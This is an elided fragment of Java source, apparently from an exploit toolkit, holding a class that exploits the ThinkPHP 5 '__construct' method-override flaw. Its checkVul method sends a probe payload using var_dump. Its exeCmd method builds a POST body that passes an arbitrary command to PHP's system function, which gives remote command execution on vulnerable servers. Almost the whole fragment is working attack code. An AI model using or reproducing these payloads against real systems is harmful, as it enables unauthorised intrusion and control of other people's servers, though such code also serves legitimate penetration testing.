...
public class TP5_construct_code_exec_3 implements ExploitInterface {
    ...
    public String checkVul(String url) {
        ...
        String payload = "s=dylan&_method=__construct&method=POST&filter[]=var_dump";
    ...
    public String exeCmd(String cmd, String encoding) {
        ...
        String payload = "s=" + cmd + "&_method=__construct&method=POST&filter[]=system";
        this.headers.put("Content-type", "application/x-www-form-urlencoded");
